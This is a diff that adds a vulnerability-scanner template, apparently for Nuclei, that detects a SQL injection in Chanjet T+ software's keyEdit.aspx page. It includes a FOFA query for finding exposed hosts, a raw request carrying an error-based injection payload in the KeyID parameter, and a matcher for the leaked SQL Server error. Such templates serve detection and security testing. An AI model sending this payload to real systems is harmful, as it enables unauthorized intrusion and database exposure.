@@ -1,0 +1,27 @@
+id:   CJT-keyEdit-SQL
+
+info:
+  name:   CJT-keyEdit-SQL
+  author: lengmo
+  severity: high
+  description:   CJT-keyEdit-SQL
+  tags: sqi
+  metadata:
+    fofa-qeury: app="畅捷通-TPlus"
+    veified: true
+    max-request: 1
+
+http:
+  - raw:
+      - |
+        GET /tplus/UFAQD/keyEdit.aspx?KeyID=1%27%20and%201=(select%20@@version)%20--&preload=1 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Linux; Android 11; motorola edge 20 fusion) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.61 Mobile Safari/537.36
+        Accept-Charset: utf-8
+        Accept-Encoding: gzip, deflate
+        Connection: close
+               
+    matchers:     
+      - type: dsl
+        dsl:
+          - "status_code == 500 && contains(body,'Microsoft SQL Server') && contains(body,'Windows')" 
